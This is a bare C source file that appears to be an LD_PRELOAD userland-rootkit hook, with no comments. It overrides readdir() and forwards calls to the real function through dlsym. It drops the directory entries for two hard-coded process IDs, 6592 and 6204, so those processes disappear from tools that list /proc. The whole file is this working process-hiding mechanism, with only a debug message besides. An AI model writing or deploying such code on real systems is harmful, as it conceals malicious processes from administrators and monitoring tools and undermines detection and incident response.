#include <error.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>

#define __USE_GNU
#include <dlfcn.h>

static struct dirent *(*orig_readdir) (DIR *) = NULL;
static const char* hide_process = "6592";
static const char* hide_process2 = "6204";

struct dirent *readdir (DIR * dirp){
   if (orig_readdir == NULL){
      orig_readdir = dlsym (RTLD_NEXT, "readdir");
      if (orig_readdir == NULL)
         error (1, errno, "dlsym");
      fprintf(stderr, "Catched\n");
   }

   struct dirent* ret = orig_readdir(dirp);
   
   while (ret != NULL && (strcmp(ret->d_name,hide_process) == 0 || strcmp(ret->d_name,hide_process2) == 0 )){
      ret = orig_readdir (dirp);
   }
   return ret;
     
}
